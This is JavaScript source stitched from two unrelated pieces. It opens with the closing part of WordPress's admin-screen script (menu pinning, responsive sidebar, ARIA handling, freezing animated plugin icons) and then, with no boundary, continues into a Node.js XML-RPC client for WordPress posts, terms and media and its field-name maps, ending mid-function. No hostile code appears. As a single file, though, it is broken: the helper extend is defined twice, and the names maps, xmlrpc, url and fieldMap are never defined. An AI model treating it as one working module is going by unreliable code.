	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function unpinMenu() {
		if ( isIOS || ! menuIsPinned ) {
			return;
		}

		pinnedMenuTop = pinnedMenuBottom = menuIsPinned = false;
		$adminMenuWrap.css({
			position: '',
			top: '',
			bottom: ''
		});
	}

	/**
	 * Pins and unpins the menu when applicable.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function setPinMenu() {
		resetHeights();

		if ( $adminmenu.data('wp-responsive') ) {
			$body.removeClass( 'sticky-menu' );
			unpinMenu();
		} else if ( height.menu + height.adminbar > height.window ) {
			pinMenu();
			$body.removeClass( 'sticky-menu' );
		} else {
			$body.addClass( 'sticky-menu' );
			unpinMenu();
		}
	}

	if ( ! isIOS ) {
		$window.on( 'scroll.pin-menu', pinMenu );
		$document.on( 'tinymce-editor-init.pin-menu', function( event, editor ) {
			editor.on( 'wp-autoresize', resetHeights );
		});
	}

	/**
	 * Changes the sortables and responsiveness of metaboxes.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	window.wpResponsive = {

		/**
		 * Initializes the wpResponsive object.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		init: function() {
			var self = this;

			this.maybeDisableSortables = this.maybeDisableSortables.bind( this );

			// Modify functionality based on custom activate/deactivate event.
			$document.on( 'wp-responsive-activate.wp-responsive', function() {
				self.activate();
				self.toggleAriaHasPopup( 'add' );
			}).on( 'wp-responsive-deactivate.wp-responsive', function() {
				self.deactivate();
				self.toggleAriaHasPopup( 'remove' );
			});

			$( '#wp-admin-bar-menu-toggle a' ).attr( 'aria-expanded', 'false' );

			// Toggle sidebar when toggle is clicked.
			$( '#wp-admin-bar-menu-toggle' ).on( 'click.wp-responsive', function( event ) {
				event.preventDefault();

				// Close any open toolbar submenus.
				$adminbar.find( '.hover' ).removeClass( 'hover' );

				$wpwrap.toggleClass( 'wp-responsive-open' );
				if ( $wpwrap.hasClass( 'wp-responsive-open' ) ) {
					$(this).find('a').attr( 'aria-expanded', 'true' );
					$( '#adminmenu a:first' ).trigger( 'focus' );
				} else {
					$(this).find('a').attr( 'aria-expanded', 'false' );
				}
			} );

			// Close sidebar when target moves outside of toggle and sidebar.
			$( document ).on( 'click', function( event ) {
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) || ! document.hasFocus() ) {
					return;
				}

				var focusIsInToggle  = $.contains( $( '#wp-admin-bar-menu-toggle' )[0], event.target );
				var focusIsInSidebar = $.contains( $( '#adminmenuwrap' )[0], event.target );

				if ( ! focusIsInToggle && ! focusIsInSidebar ) {
					$( '#wp-admin-bar-menu-toggle' ).trigger( 'click.wp-responsive' );
				}
			} );

			// Close sidebar when a keypress completes outside of toggle and sidebar.
			$( document ).on( 'keyup', function( event ) {
				var toggleButton   = $( '#wp-admin-bar-menu-toggle' )[0];
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) ) {
				    return;
				}
				if ( 27 === event.keyCode ) {
					$( toggleButton ).trigger( 'click.wp-responsive' );
					$( toggleButton ).find( 'a' ).trigger( 'focus' );
				} else {
					if ( 9 === event.keyCode ) {
						var sidebar        = $( '#adminmenuwrap' )[0];
						var focusedElement = event.relatedTarget || document.activeElement;
						// A brief delay is required to allow focus to switch to another element.
						setTimeout( function() {
							var focusIsInToggle  = $.contains( toggleButton, focusedElement );
							var focusIsInSidebar = $.contains( sidebar, focusedElement );

							if ( ! focusIsInToggle && ! focusIsInSidebar ) {
								$( toggleButton ).trigger( 'click.wp-responsive' );
							}
						}, 10 );
					}
				}
			});

			// Add menu events.
			$adminmenu.on( 'click.wp-responsive', 'li.wp-has-submenu > a', function( event ) {
				if ( ! $adminmenu.data('wp-responsive') ) {
					return;
				}
				let state = ( 'false' === $( this ).attr( 'aria-expanded' ) ) ? 'true' : 'false';
				$( this ).parent( 'li' ).toggleClass( 'selected' );
				$( this ).attr( 'aria-expanded', state );
				$( this ).trigger( 'focus' );
				event.preventDefault();
			});

			self.trigger();
			$document.on( 'wp-window-resized.wp-responsive', this.trigger.bind( this ) );

			// This needs to run later as UI Sortable may be initialized when the document is ready.
			$window.on( 'load.wp-responsive', this.maybeDisableSortables );
			$document.on( 'postbox-toggled', this.maybeDisableSortables );

			// When the screen columns are changed, potentially disable sortables.
			$( '#screen-options-wrap input' ).on( 'click', this.maybeDisableSortables );
		},

		/**
		 * Disable sortables if there is only one metabox, or the screen is in one column mode. Otherwise, enable sortables.
		 *
		 * @since 5.3.0
		 *
		 * @return {void}
		 */
		maybeDisableSortables: function() {
			var width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? $window.width() : window.innerWidth;

			if (
				( width <= 782 ) ||
				( 1 >= $sortables.find( '.ui-sortable-handle:visible' ).length && jQuery( '.columns-prefs-1 input' ).prop( 'checked' ) )
			) {
				this.disableSortables();
			} else {
				this.enableSortables();
			}
		},

		/**
		 * Changes properties of body and admin menu.
		 *
		 * Pins and unpins the menu and adds the auto-fold class to the body.
		 * Makes the admin menu responsive and disables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		activate: function() {
			setPinMenu();

			if ( ! $body.hasClass( 'auto-fold' ) ) {
				$body.addClass( 'auto-fold' );
			}

			$adminmenu.data( 'wp-responsive', 1 );
			this.disableSortables();
		},

		/**
		 * Changes properties of admin menu and enables metabox sortables.
		 *
		 * Pin and unpin the menu.
		 * Removes the responsiveness of the admin menu and enables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		deactivate: function() {
			setPinMenu();
			$adminmenu.removeData('wp-responsive');

			this.maybeDisableSortables();
		},

		/**
		 * Toggles the aria-haspopup attribute for the responsive admin menu.
		 *
		 * The aria-haspopup attribute is only necessary for the responsive menu.
		 * See ticket https://core.trac.wordpress.org/ticket/43095
		 *
		 * @since 6.6.0
		 *
		 * @param {string} action Whether to add or remove the aria-haspopup attribute.
		 *
		 * @return {void}
		 */
		toggleAriaHasPopup: function( action ) {
			var elements = $adminmenu.find( '[data-ariahaspopup]' );

			if ( action === 'add' ) {
				elements.each( function() {
					$( this ).attr( 'aria-haspopup', 'menu' ).attr( 'aria-expanded', 'false' );
				} );

				return;
			}

			elements.each( function() {
				$( this ).removeAttr( 'aria-haspopup' ).removeAttr( 'aria-expanded' );
			} );
		},

		/**
		 * Sets the responsiveness and enables the overlay based on the viewport width.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		trigger: function() {
			var viewportWidth = getViewportWidth();

			// Exclude IE < 9, it doesn't support @media CSS rules.
			if ( ! viewportWidth ) {
				return;
			}

			if ( viewportWidth <= 782 ) {
				if ( ! wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-activate' );
					wpResponsiveActive = true;
				}
			} else {
				if ( wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-deactivate' );
					wpResponsiveActive = false;
				}
			}

			if ( viewportWidth <= 480 ) {
				this.enableOverlay();
			} else {
				this.disableOverlay();
			}

			this.maybeDisableSortables();
		},

		/**
		 * Inserts a responsive overlay and toggles the window.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableOverlay: function() {
			if ( $overlay.length === 0 ) {
				$overlay = $( '<div id="wp-responsive-overlay"></div>' )
					.insertAfter( '#wpcontent' )
					.hide()
					.on( 'click.wp-responsive', function() {
						$toolbar.find( '.menupop.hover' ).removeClass( 'hover' );
						$( this ).hide();
					});
			}

			$toolbarPopups.on( 'click.wp-responsive', function() {
				$overlay.show();
			});
		},

		/**
		 * Disables the responsive overlay and removes the overlay.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableOverlay: function() {
			$toolbarPopups.off( 'click.wp-responsive' );
			$overlay.hide();
		},

		/**
		 * Disables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'disable' );
					$sortables.find( '.ui-sortable-handle' ).addClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		},

		/**
		 * Enables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'enable' );
					$sortables.find( '.ui-sortable-handle' ).removeClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		}
	};

	/**
	 * Add an ARIA role `button` to elements that behave like UI controls when JavaScript is on.
	 *
	 * @since 4.5.0
	 *
	 * @return {void}
	 */
	function aria_button_if_js() {
		$( '.aria-button-if-js' ).attr( 'role', 'button' );
	}

	$( document ).on( 'ajaxComplete', function() {
		aria_button_if_js();
	});

	/**
	 * Get the viewport width.
	 *
	 * @since 4.7.0
	 *
	 * @return {number|boolean} The current viewport width or false if the
	 *                          browser doesn't support innerWidth (IE < 9).
	 */
	function getViewportWidth() {
		var viewportWidth = false;

		if ( window.innerWidth ) {
			// On phones, window.innerWidth is affected by zooming.
			viewportWidth = Math.max( window.innerWidth, document.documentElement.clientWidth );
		}

		return viewportWidth;
	}

	/**
	 * Sets the admin menu collapsed/expanded state.
	 *
	 * Sets the global variable `menuState` and triggers a custom event passing
	 * the current menu state.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	function setMenuState() {
		var viewportWidth = getViewportWidth() || 961;

		if ( viewportWidth <= 782  ) {
			menuState = 'responsive';
		} else if ( $body.hasClass( 'folded' ) || ( $body.hasClass( 'auto-fold' ) && viewportWidth <= 960 && viewportWidth > 782 ) ) {
			menuState = 'folded';
		} else {
			menuState = 'open';
		}

		$document.trigger( 'wp-menu-state-set', { state: menuState } );
	}

	// Set the menu state when the window gets resized.
	$document.on( 'wp-window-resized.set-menu-state', setMenuState );

	/**
	 * Sets ARIA attributes on the collapse/expand menu button.
	 *
	 * When the admin menu is open or folded, updates the `aria-expanded` and
	 * `aria-label` attributes of the button to give feedback to assistive
	 * technologies. In the responsive view, the button is always hidden.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	$document.on( 'wp-menu-state-set wp-collapse-menu', function( event, eventData ) {
		var $collapseButton = $( '#collapse-button' ),
			ariaExpanded, ariaLabelText;

		if ( 'folded' === eventData.state ) {
			ariaExpanded = 'false';
			ariaLabelText = __( 'Expand Main menu' );
		} else {
			ariaExpanded = 'true';
			ariaLabelText = __( 'Collapse Main menu' );
		}

		$collapseButton.attr({
			'aria-expanded': ariaExpanded,
			'aria-label': ariaLabelText
		});
	});

	window.wpResponsive.init();
	setPinMenu();
	setMenuState();
	makeNoticesDismissible();
	aria_button_if_js();

	$document.on( 'wp-pin-menu wp-window-resized.pin-menu postboxes-columnchange.pin-menu postbox-toggled.pin-menu wp-collapse-menu.pin-menu wp-scroll-start.pin-menu', setPinMenu );

	// Set initial focus on a specific element.
	$( '.wp-initial-focus' ).trigger( 'focus' );

	// Toggle update details on update-core.php.
	$body.on( 'click', '.js-update-details-toggle', function() {
		var $updateNotice = $( this ).closest( '.js-update-details' ),
			$progressDiv = $( '#' + $updateNotice.data( 'update-details' ) );

		/*
		 * When clicking on "Show details" move the progress div below the update
		 * notice. Make sure it gets moved just the first time.
		 */
		if ( ! $progressDiv.hasClass( 'update-details-moved' ) ) {
			$progressDiv.insertAfter( $updateNotice ).addClass( 'update-details-moved' );
		}

		// Toggle the progress div visibility.
		$progressDiv.toggle();
		// Toggle the Show Details button expanded state.
		$( this ).attr( 'aria-expanded', $progressDiv.is( ':visible' ) );
	});
});

/**
 * Hides the update button for expired plugin or theme uploads.
 *
 * On the "Update plugin/theme from uploaded zip" screen, once the upload has expired,
 * hides the "Replace current with uploaded" button and displays a warning.
 *
 * @since 5.5.0
 */
$( function( $ ) {
	var $overwrite, $warning;

	if ( ! $body.hasClass( 'update-php' ) ) {
		return;
	}

	$overwrite = $( 'a.update-from-upload-overwrite' );
	$warning   = $( '.update-from-upload-expired' );

	if ( ! $overwrite.length || ! $warning.length ) {
		return;
	}

	window.setTimeout(
		function() {
			$overwrite.hide();
			$warning.removeClass( 'hidden' );

			if ( window.wp && window.wp.a11y ) {
				window.wp.a11y.speak( $warning.text() );
			}
		},
		7140000 // 119 minutes. The uploaded file is deleted after 2 hours.
	);
} );

// Fire a custom jQuery event at the end of window resize.
( function() {
	var timeout;

	/**
	 * Triggers the WP window-resize event.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function triggerEvent() {
		$document.trigger( 'wp-window-resized' );
	}

	/**
	 * Fires the trigger event again after 200 ms.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function fireOnce() {
		window.clearTimeout( timeout );
		timeout = window.setTimeout( triggerEvent, 200 );
	}

	$window.on( 'resize.wp-fire-once', fireOnce );
}());

// Make Windows 8 devices play along nicely.
(function(){
	if ( '-ms-user-select' in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/) ) {
		var msViewportStyle = document.createElement( 'style' );
		msViewportStyle.appendChild(
			document.createTextNode( '@-ms-viewport{width:auto!important}' )
		);
		document.getElementsByTagName( 'head' )[0].appendChild( msViewportStyle );
	}
})();

}( jQuery, window ));

/**
 * Freeze animated plugin icons when reduced motion is enabled.
 *
 * When the user has enabled the 'prefers-reduced-motion' setting, this module
 * stops animations for all GIFs on the page with the class 'plugin-icon' or
 * plugin icon images in the update plugins table.
 *
 * @since 6.4.0
 */
(function() {
	// Private variables and methods.
	var priv = {},
		pub = {},
		mediaQuery;

	// Initialize pauseAll to false; it will be set to true if reduced motion is preferred.
	priv.pauseAll = false;
	if ( window.matchMedia ) {
		mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
		if ( ! mediaQuery || mediaQuery.matches ) {
			priv.pauseAll = true;
		}
	}

	// Method to replace animated GIFs with a static frame.
	priv.freezeAnimatedPluginIcons = function( img ) {
		var coverImage = function() {
			var width = img.width;
			var height = img.height;
			var canvas = document.createElement( 'canvas' );

			// Set canvas dimensions.
			canvas.width = width;
			canvas.height = height;

			// Copy classes from the image to the canvas.
			canvas.className = img.className;

			// Check if the image is inside a specific table.
			var isInsideUpdateTable = img.closest( '#update-plugins-table' );

			if ( isInsideUpdateTable ) {
				// Transfer computed styles from image to canvas.
				var computedStyles = window.getComputedStyle( img ),
					i, max;
				for ( i = 0, max = computedStyles.length; i < max; i++ ) {
					var propName = computedStyles[ i ];
					var propValue = computedStyles.getPropertyValue( propName );
					canvas.style[ propName ] = propValue;
				}
			}

			// Draw the image onto the canvas.
			canvas.getContext( '2d' ).drawImage( img, 0, 0, width, height );

			// Set accessibility attributes on canvas.
			canvas.setAttribute( 'aria-hidden', 'true' );
			canvas.setAttribute( 'role', 'presentation' );

			// Insert canvas before the image and set the image to be near-invisible.
			var parent = img.parentNode;
			parent.insertBefore( canvas, img );
			img.style.opacity = 0.01;
			img.style.width = '0px';
			img.style.height = '0px';
		};

		// If the image is already loaded, apply the coverImage function.
		if ( img.complete ) {
			coverImage();
		} else {
			// Otherwise, wait for the image to load.
			img.addEventListener( 'load', coverImage, true );
		}
	};

	// Public method to freeze all relevant GIFs on the page.
	pub.freezeAll = function() {
		var images = document.querySelectorAll( '.plugin-icon, #update-plugins-table img' );
		for ( var x = 0; x < images.length; x++ ) {
			if ( /\.gif(?:\?|$)/i.test( images[ x ].src ) ) {
				priv.freezeAnimatedPluginIcons( images[ x ] );
			}
		}
	};

	// Only run the freezeAll method if the user prefers reduced motion.
	if ( true === priv.pauseAll ) {
		pub.freezeAll();
	}

	// Listen for jQuery AJAX events.
	( function( $ ) {
		if ( window.pagenow === 'plugin-install' ) {
			// Only listen for ajaxComplete if this is the plugin-install.php page.
			$( document ).ajaxComplete( function( event, xhr, settings ) {

				// Check if this is the 'search-install-plugins' request.
				if ( settings.data && typeof settings.data === 'string' && settings.data.includes( 'action=search-install-plugins' ) ) {
					// Recheck if the user prefers reduced motion.
					if ( window.matchMedia ) {
						var mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
						if ( mediaQuery.matches ) {
							pub.freezeAll();
						}
					} else {
						// Fallback for browsers that don't support matchMedia.
						if ( true === priv.pauseAll ) {
							pub.freezeAll();
						}
					}
				}
			} );
		}
	} )( jQuery );

	// Expose public methods.
	return pub;
})();
// http://codex.wordpress.org/XML-RPC_Support
// http://codex.wordpress.org/XML-RPC_WordPress_API

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function parseArguments( args ) {
	return [].slice.call( args, 1 )

		// Remove null arguments
		// Null values only exist for optional fields. As of WordPress 4.4,
		// null is no longer treated the same as omitting the value. To
		// compensate for this, we just drop the argument before calling
		// into WordPress. See #25.
		.filter(function( value ) {
			return value !== null;
		});
}

function Client( settings ) {
	[ "url", "username", "password" ].forEach(function( prop ) {
		if ( !settings[prop] ) {
			throw new Error( "Missing required setting: " + prop );
		}
	});

	var parsedUrl = Client.parseUrl( settings.url );
	this.rpc = xmlrpc[ parsedUrl.secure ? "createSecureClient" : "createClient" ]({
		host: settings.host || parsedUrl.host,
		port: parsedUrl.port,
		path: parsedUrl.path,
		rejectUnauthorized: settings.rejectUnauthorized !== undefined ? settings.rejectUnauthorized : true,
		servername: settings.host || parsedUrl.host,

		// Always set Host header in case we're pointing to a different server
		// via settings.host
		headers: {
			Host: parsedUrl.host
		},
		basic_auth: !settings.basicAuth ? null : {
			user: settings.basicAuth.username,
			pass: settings.basicAuth.password
		}
	});
	this.blogId = settings.blogId || 0;
	this.username = settings.username;
	this.password = settings.password;
}

Client.parseUrl = function( wpUrl ) {
	var urlParts, secure;

	// allow URLs without a protocol
	if ( !(/\w+:\/\//.test( wpUrl ) ) ) {
		wpUrl = "http://" + wpUrl;
	}
	urlParts = url.parse( wpUrl );
	secure = urlParts.protocol === "https:";

	return {
		host: urlParts.hostname,
		port: urlParts.port || (secure ? 443 : 80),
		path: urlParts.path.replace( /\/+$/, "" ) + "/xmlrpc.php",
		secure: secure
	};
};

extend( Client.prototype, {
	call: function( method ) {
		var args = parseArguments( arguments ),
			fn = args.pop();

		if ( typeof fn !== "function" ) {
			args.push( fn );
			fn = null;
		}

		this.rpc.methodCall( method, args, function( error, data ) {
			if ( !error ) {
				return fn( null, data );
			}

			if ( error.code === "ENOTFOUND" && error.syscall === "getaddrinfo" ) {
				error.message = "Unable to connect to WordPress.";
			} else if ( error.message === "Unknown XML-RPC tag 'TITLE'" ) {
				var additional = error.res.statusCode;
				if (error.res.statusMessage) {
					additional += "; " + error.res.statusMessage;
				}

				error.message = "(" + additional + ") " + error.message;
			}

			fn( error );
		});
	},

	authenticatedCall: function() {
		var args = [].slice.call( arguments );
		args.splice( 1, 0, this.blogId, this.username, this.password );
		this.call.apply( this, args );
	},

	listMethods: function( fn ) {
		this.call( "system.listMethods", fn );
	}
});

extend( Client.prototype, {
	getPost: function( id, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPost", id, fields, function( error, post ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( post, "post" ) );
		});
	},

	getPosts: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( filter.type ) {
			filter.post_type = filter.type;
			delete filter.type;
		}

		if ( filter.status ) {
			filter.post_status = filter.status;
			delete filter.status;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "post" )[ 0 ];
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPosts", filter, fields, function( error, posts ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, posts.map(function( post ) {
				return fieldMap.from( post, "post" );
			}));
		});
	},

	newPost: function( data, fn ) {
		this.authenticatedCall( "wp.newPost", fieldMap.to( data, "post" ), fn );
	},

	// to remove a term, just set the terms and leave out the id that you want to remove
	// to remove a custom field, pass the id with no key or value
	editPost: function( id, data, fn ) {
		this.authenticatedCall( "wp.editPost", id, fieldMap.to( data, "post" ), fn );
	},

	deletePost: function( id, fn ) {
		this.authenticatedCall( "wp.deletePost", id, fn );
	},

	getPostType: function( name, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostType", name, fields, function( error, postType ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( postType, "postType" ) );
		});
	},

	getPostTypes: function( filter, fields, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			fields = null;
			filter = {};
		}

		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( Array.isArray(filter) ) {
			fields = filter;
			filter = {};
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "postType" );
		}

		this.authenticatedCall( "wp.getPostTypes", filter, fields, function( error, postTypes ) {
			if ( error ) {
				return fn( error );
			}

			Object.keys( postTypes ).forEach(function( postType ) {
				postTypes[ postType ] = fieldMap.from( postTypes[ postType ], "postType" );
			});
			fn( null, postTypes );
		});
	}
});

extend( Client.prototype, {
	getTaxonomy: function( name, fn ) {
		this.authenticatedCall( "wp.getTaxonomy", name, function( error, taxonomy ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( taxonomy, "taxonomy" ) );
		});
	},

	getTaxonomies: function( fn ) {
		this.authenticatedCall( "wp.getTaxonomies", function( error, taxonomies ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, taxonomies.map(function( taxonomy ) {
				return fieldMap.from( taxonomy, "taxonomy" );
			}));
		});
	},

	getTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.getTerm", taxonomy, id, function( error, term ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( term, "term" ) );
		});
	},

	getTerms: function( taxonomy, filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		if ( filter.hideEmpty ) {
			filter.hide_empty = filter.hideEmpty;
			delete filter.hideEmpty;
		}

		if ( filter.orderby ) {
			filter.orderby = fieldMap.array( [ filter.orderby ], "term" )[ 0 ];
		}

		this.authenticatedCall( "wp.getTerms", taxonomy, filter, function( error, terms ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, terms.map(function( term ) {
				return fieldMap.from( term, "term" );
			}));
		});
	},

	newTerm: function( data, fn ) {
		this.authenticatedCall( "wp.newTerm", fieldMap.to( data, "term" ), fn );
	},

	editTerm: function( id, data, fn ) {
		this.authenticatedCall( "wp.editTerm", id, fieldMap.to( data, "term" ), fn );
	},

	deleteTerm: function( taxonomy, id, fn ) {
		this.authenticatedCall( "wp.deleteTerm", taxonomy, id, fn );
	}
});

extend( Client.prototype, {
	getMediaItem: function( id, fn ) {
		this.authenticatedCall( "wp.getMediaItem", id, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( media, "media" ) );
		});
	},

	getMediaLibrary: function( filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		this.authenticatedCall( "wp.getMediaLibrary", filter, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, media.map(function( item ) {
				return fieldMap.from( item, "media" );
			}));
		});
	},

	uploadFile: function( data, fn ) {
		this.authenticatedCall( "wp.uploadFile", fieldMap.to( data, "file" ), fn );
	}
});

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function createFieldMaps( renames, toFns, fromFns ) {
	var to = extend( {}, renames ),
		from = {};

	Object.keys( renames ).forEach(function( key ) {
		from[ renames[ key ] ] = key;
	});

	return {
		renames: renames,
		to: extend( to, toFns ),
		from: extend( from, fromFns )
	};
}

function mapFields( data, map ) {
	var field, value, mappedField,
		ret = {};

	for ( field in data ) {
		value = data[ field ];
		mappedField = map[ field ];

		// no map -> delete
		if ( !mappedField ) {
			continue;
		// string -> change field name
		} else if ( typeof mappedField === "string" ) {
			ret[ mappedField ] = value;
		// function -> merge result
		} else {
			extend( ret, mappedField( value ) );
		}
	}

	return ret;
}

maps.labels = createFieldMaps({
	addNewItem: "add_new_item",
	addOrRemoveItems: "add_or_remove_items",
	allItems: "all_items",
	chooseFromMostUsed: "choose_from_most_used",
	editItem: "edit_item",
	menuName: "menu_name",
	name: "name",
	nameAdminBar: "name_admin_bar",
	newItemName: "new_item_name",
	parentItem: "parent_item",
	parentItemColon: "parent_item_colon",
	popularItems: "popular_items",
	searchItems: "search_items",
	separateItemsWithCommas: "separate_items_with_commas",
	singularName: "singular_name",
	updateItem: "update_item",
	viewItem: "view_item"
});

maps.post = createFieldMaps({
	author: /* int */ "post_author",
	commentStatus: /* string */ "comment_status",
	content: /* string */ "post_content",
	customFields: /* array */ "custom_fields",
	date: /* datetime */ "post_date",
	excerpt: /* string */ "post_excerpt",
	format: /* string */"post_format",
	id: /* string */ "post_id", /* readonly */
	link: /* string */ "link" /* readonly */,
	modified: /* datetime */ "post_modified",
	menuOrder: /* int */ "menu_order",
	name: /* string */ "post_name",
	pageTemplate: /* string */ "page_template",
	parent: /* int */ "post_parent",
	password: /* string */ "post_password",
	pingStatus: /* string */ "ping_status",
	status: /* string */ "post_status",
	sticky: /* bool */ "sticky",
	terms: /* struct */ "terms" /* array */,
	termNames: /* struct */ "terms_names",
	thumbnail: /* int */ "post_thumbnail",
	title: /* string */ "post_title",
	type: /* string */ "post_type"
}, {}, {
	post_date_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},
	post_modified_gmt: /* datetime */ function( date ) {
		return {
			modified: new Date( date )
		};
	}
});

maps.postType = createFieldMaps({
	_builtin: /* bool */ "_builtin",
	cap: /* struct */ "cap",
	capabilityType: /* string */ "capability_type",
	description: /* string */ "description",
	_editLink: /* string */ "_edit_link",
	excludeFromSearch: /* bool */ "exclude_from_search",
	hasArchive: /* bool */ "has_archive",
	hierarchical: /* bool */ "hierarchical",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	mapMetaCap: /* bool */ "map_meta_cap",
	menuIcon: /* string */ "menu_icon",
	menuPosition: /* int */ "menu_position",
	name: /* string */ "name",
	"public": /* bool */ "public",
	publiclyQuerably: /* bool */ "publicly_queryable",
	queryVar: /* mixed */ "query_var",
	rewrite: /* mixed */ "rewrite",
	showInAdminBar: /* bool */ "show_in_admin_bar",
	showInMenu: /* bool */ "show_in_menu",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showUi: /* bool */ "show_ui",
	supports: /* array */ "supports",
	taxonomies: /* array */ "taxonomies"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.postTypeCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.postTypeCap = createFieldMaps({
	deleteOthersPosts: /* string */ "delete_others_posts",
	deletePost: /* string */ "delete_post",
	deletePosts: /* string */ "delete_posts",
	deletePrivatePosts: /* string */ "delete_private_posts",
	deletePublishedPosts: /* string */ "delete_published_posts",
	editOthersPosts: /* string */ "edit_others_posts",
	editPost: /* string */ "edit_post",
	editPosts: /* string */ "edit_posts",
	editPrivatePosts: /* string */ "edit_private_posts",
	editPublishedPosts: /* string */ "edit_published_posts",
	publishPosts: /* string */ "publish_posts",
	read: /* string */ "read",
	readPost: /* sring */ "read_post",
	readPrivatePosts: /* string */ "read_private_posts"
});

maps.taxonomy = createFieldMaps({
	cap: /* struct */ "cap",
	hierarchical: /* bool */ "hierarchical",
	name: /* string */ "name",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	objectType: /* array */ "object_type",
	"public": /* bool */ "public",
	queryVar: /* string */ "query_var",
	rewrite: /* struct */ "rewrite",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showTagCloud: /* bool */ "show_tagcloud",
	showUi: /* bool */ "show_ui"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.taxonomyCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.taxonomyCap = createFieldMaps({
	assignTerms: /* string */ "assign_terms",
	deleteTerms: /* string */ "delete_terms",
	editTerms: /* string */ "edit_terms",
	manageTerms: /* string */ "manage_terms"
});

maps.term = createFieldMaps({
	count: /* int */ "count", /* readonly */
	description: /* string */ "description",
	name: /* string */ "name",
	parent: /* string */ "parent",
	slug: /* string */ "slug",
	taxonomy: /* string */ "taxonomy",
	termId: /* string */ "term_id", /* readonly */
	termTaxonomyId: /* string */ "term_taxonomy_id" /* readonly */
});

maps.file = createFieldMaps({
	name: /* string */ "name",
	type: /* string */ "type",
	bits: /* string */ "bits",
	overwrite: /* boolean */ "overwrite",
	postId: /* int */ "post_id"
});

maps.media = createFieldMaps({
	attachmentId: /* string */ "attachment_id", /* readonly */
	caption: /* string */ "caption",
	description: /* string */ "description",
	link: /* string */ "link",
	parent: /* int */ "parent",
	thumbnail: /* string */ "thumbnail",
	title: /* string */ "title",
	type: /* string */ "type"
}, {}, {
	date_created_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},

	metadata: /* struct */ function( data ) {
		return {
			metadata: mapFields( data, maps.mediaItemMetadata.from )
		};
	}
});

maps.mediaItemMetadata = createFieldMaps({
	file: /* string */ "file",
	height: /* int */ "height",
	sizes: /* struct */ "sizes",
	width: /* int */ "width"
}, {}, {
	sizes: /* struct */ function( size ) {
		var keys = Object.keys( size ),
		    results = {};

		// Loop through the available sizes and map the fields
		keys.forEach(function( key, i ) {
			results[ keys[ i ] ] = mapFields( size[ keys[ i ] ], maps.mediaItemSize.from );
		});

		return {
			sizes: results
		};
	},

